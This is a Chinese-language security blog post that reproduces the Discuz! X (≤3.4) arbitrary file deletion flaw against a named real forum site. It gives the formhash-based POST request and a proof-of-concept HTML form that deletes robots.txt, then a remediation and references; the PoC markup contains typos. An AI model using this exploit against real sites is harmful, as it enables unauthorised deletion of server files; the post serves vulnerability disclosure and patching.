---
layout: post
title: "Discuz x Arbitrary file deletion"
subtitle: "Discuz x 任意文件删除复现"
date: 2019-01-17
author: ppbibo
category: security
finished: true
---
[TOC]

# Discuz x 任意文件删除复现

Discuz x Arbitrary file deletion



#### 前言：

上次爆出过dz任意删除文件的漏洞，这次正好测试一下。

域名： [http://bbs.czxy.com](http://bbs.czxy.com/)

标题： 传智专修学院社区_传智专修学院交流社区 - Powered by Discuz!

后台URL：[http://bbs.czxy.com/admin.php](http://bbs.czxy.com/admin.php)

CMS & Version：Discuz x3.3

 • 对传智专修学院社区进行安全测试。

 • 已修复。

##### 影响范围

Discuz!X ≤3.4

#### 复现过程：

访问：[http://bbs.czxy.com/robots.txt](http://bbs.czxy.com/robots.txt)

[![QQ20190117-142633@2x](/static/img/QQ20190117-142633@2x.png)](/static/img/QQ20190117-142633@2x.png)

登录用户访问：

[http://bbs.czxy.com/home.php?mod=spacecp&ac=profile](http://bbs.czxy.com/home.php?mod=spacecp&ac=profile)

查看源代码下formhash的值

[![QQ20190117-142618@2x](/static/img/QQ20190117-142618@2x.png)](/static/img/QQ20190117-142618@2x.png)

```
请求：http://bbs.czxy.com/home.php?mod=spacecp&ac=profile

POST提交：

birthprovince=robots.txt&profilesubmit=1&formhash=ba84488f
```

[![QQ20190117-142704@2x](/static/img/QQ20190117-142704@2x.png)](/static/img/QQ20190117-142704@2x.png)

#### 构造poc

**Filename : Poc.html**

```
<form>

action="http://bbs.czxy.com/home.php?mod=spacecp&ac=profile&op=base&deletefile[birthprovince]=zsdlove" method="POST" enctype="multipart/form-data">

<input type="file" name="birthprovince" id="file" /> <br><br>

<input type="text" name="formhash" value="ba84488f"/><br><br>

<input type="text" name="profilesubmit" value="1"/><br><br>

<input type="submit" value="Submit" />

</from>
```

[![QQ20190117-142720@2x](/static/img/QQ20190117-142720@2x.png)](/static/img/QQ20190117-142720@2x.png)

上传任意图片提交，访问[http://bbs.czxy.com/robots.txt](http://bbs.czxy.com/robots.txt)

[![QQ20190117-143006@2x](/static/img/QQ20190117-143006@2x.png)](/static/img/QQ20190117-143006@2x.png)

/robots.txt 文件已被删除。

#### 修复方案

https://www.sinesafe.com/article/20171006/discuz3.2.html

删除unlink相关代码。

```
# 备份的robots.txt
# robots.txt for Discuz! X3
#

User-agent: *
Disallow: /api/
Disallow: /data/
Disallow: /source/
Disallow: /install/
Disallow: /template/
Disallow: /config/
Disallow: /uc_client/
Disallow: /uc_server/
Disallow: /static/
Disallow: /admin.php
Disallow: /search.php
Disallow: /member.php
Disallow: /api.php
Disallow: /misc.php
Disallow: /connect.php
Disallow: /forum.php?mod=redirect*
Disallow: /forum.php?mod=post*
Disallow: /home.php?mod=spacecp*
Disallow: /userapp.php?mod=app&*
Disallow: /*?mod=misc*
Disallow: /*?mod=attachment*
Disallow: /*mobile=yes*
```

##### 参考链接

https://www.sinesafe.com/article/20171006/discuz3.2.html

[http://www.freebuf.com/vuls/149904.html](http://www.freebuf.com/vuls/149904.html)

https://xz.aliyun.com/t/34#toc-5